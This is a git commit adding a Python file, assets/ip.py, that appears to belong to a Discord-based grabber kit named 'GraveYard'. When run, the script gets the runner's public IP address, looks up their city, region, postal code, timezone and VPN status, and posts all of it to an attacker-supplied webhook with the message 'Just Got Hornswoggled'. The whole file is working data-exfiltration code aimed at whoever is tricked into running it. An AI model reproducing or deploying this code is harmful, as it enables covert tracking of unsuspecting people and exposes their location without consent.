ffea82d0c876a3d57dd2da6d2d2423523db504eb
b6m <65096390+b6m@users.noreply.github.com>
2022-04-09 20:58:36 +0200

    Add files via upload

---
+++ assets/ip.py
@@ -0,0 +1,35 @@
+import requests;from requests import get;import json
+ip          =    get('https://api.ipify.org').text
+city        =    get(f'https://ipapi.co/{ip}/city').text 
+region      =    get(f'https://ipapi.co/{ip}/region').text
+postal      =    get(f'https://ipapi.co/{ip}/postal').text
+timezone    =    get(f'https://ipapi.co/{ip}/timezone').text
+currency    =    get(f'https://ipapi.co/{ip}/currency').text
+country     =    get(f'https://ipapi.co/{ip}/country_name').text
+callcode    =    get(f"https://ipapi.co/{ip}/country_calling_code").text
+vpn         =    get('http://ip-api.com/json?fields=proxy').text
+
+def 一(webhook:str):
+    data = {
+    "content" : f"""
+    **__{ip} Just Got Hornswoggled__**
+    **__Ip Info / 👻 __**                                                                               
+    > <:rip:959916670946791474> # **Country |  {country}**
+    > <:rip:959916670946791474> # **City | {city}**
+    > <:rip:959916670946791474> # **Region | {region}**
+    > <:rip:959916670946791474> # **Postal Code | {postal}**
+    > <:rip:959916670946791474> # **TimeZone |  {timezone}**
+    > <:rip:959916670946791474> # **Currency |  {currency}**
+    > <:rip:959916670946791474> # **CallCode | {callcode}**
+    > <:rip:959916670946791474> # **VPN | {json.loads(vpn)['proxy']}**  
+""",
+    "username" : 
+    (
+        "GraveYard / 👻"
+    ),
+    "avatar_url" : 
+    (
+        "https://i.pinimg.com/236x/2e/a4/9b/2ea49b032782f8146c58ba2abaa7114b.jpg"
+    )
+    }
+    requests.post(webhook, json=data)
